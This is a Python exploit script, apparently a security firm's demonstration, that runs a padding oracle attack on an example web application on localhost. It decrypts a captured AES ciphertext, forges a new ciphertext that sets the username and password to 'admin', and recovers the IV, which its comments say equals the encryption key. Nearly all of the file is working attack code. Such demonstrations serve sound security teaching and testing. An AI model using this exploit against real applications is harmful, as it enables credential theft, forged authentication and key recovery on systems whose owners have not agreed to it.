#!/usr/bin/env python 
"""Exploits a Padding Oracle vulnerability in an example web application.

Exploits a Padding Oracle vulnerability in an example web application (advanced
scenario). It uses the python-paddingoracle library. Simple pattern matching is
performed to detect padding errors.
"""

from paddingoracle import BadPaddingException, PaddingOracle
import requests
import binascii
import logging

__author__ = "Georg Chalupar"
__email__ = "gchalupar@gdssecurity.com"
__copyright__ = "Copyright 2015, Gotham Digital Science Ltd"

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()

    def oracle(self, data, **kwargs):
        """Sends data to web applicaiton and detects padding exception by
        checking for 'ApplicationUsername missing' in the responses."""
        
        # prefix value that decrypts to 'ApplicationUsername=user&Passwor'
        prefix = '484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e'
        cipher = prefix + binascii.hexlify(data)
        
        # send HTTP request and receive response
        response = self.session.get('http://127.0.0.1:5000/check',
            params={'cipher': cipher}, timeout=5, verify=False)
        
        # check for error message in response and throw BadPaddingException if it maches
        if 'ApplicationUsername missing' in response.text:
            raise BadPaddingException
        
        logging.debug('No padding exception raised on {}'.format(binascii.hexlify(data)))


def xor_str(a,b):
    """XOR two hex encoded values."""
    result = int(a, 16) ^ int(b, 16) # convert to integers and xor them
    return '{:x}'.format(result)     # convert back to hexadecimal


if __name__ == '__main__':
    # enable debug logging and create padbuster instance
    logging.basicConfig(level=logging.DEBUG)
    padbuster = PadBuster()

    # value to decrypt
    cipher = '484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6'
    cipherData = binascii.unhexlify(cipher)
    
    # launch padding oracle attack to decrypt value
    # block_size=16: set block size for AES (16 bytes = 128 bits)
    # iv=None: interpret first block as IV and do attempt not decrypt it
    decrypted = padbuster.decrypt(cipherData, block_size=16, iv=None)
    
    # print results
    print('\n\n\nDecrypted cipher value: %s => %r\n' % (cipher, decrypted))
    raw_input('Press enter to continue')
    
    # value to encrypt
    plain = '=bla&ApplicationUsername=admin&Password=admin'
    
    # launch padding oracle attack to encrypt value
    # block_size=16: set block size for AES (16 bytes = 128 bits)
    encrypted = padbuster.encrypt(plain, block_size=16)
    
    # print results
    print('\n\n\nEncrypted cipher value: %s => %r\n' % (plain, binascii.hexlify(encrypted)))
    raw_input('Press enter to continue')
    
    # launch padding oracle attack to get intermediate value for first block
    # cipherData[:16]: first block of ciphertext
    # block_size=16: set block size for AES (16 bytes = 128 bits)
    # iv=bytearray(16): set iv to 0-bytes
    firstBlock = padbuster.decrypt(cipherData[:16], block_size=16, iv=bytearray(16))
    firstBlockHex = binascii.hexlify(firstBlock)
    
    # print results
    print('\n\n\nFirst block intermediate value: %s => %s' % (cipher, firstBlockHex))
    
    # calculate initialisation vector (IV) from known plaintext.
    # it is assumed that we know the plaintext for the first block
    knownPlain = 'ApplicationUsern'
    iv = xor_str(binascii.hexlify(knownPlain), firstBlockHex)
    
    # print results
    print('\n\n\n%s (plaintext %s)' % (binascii.hexlify(knownPlain), knownPlain))
    print('XOR')
    print('%s (intermediate value)' % firstBlockHex)
    print('=')
    print('%s (IV = encryption key)' % iv)
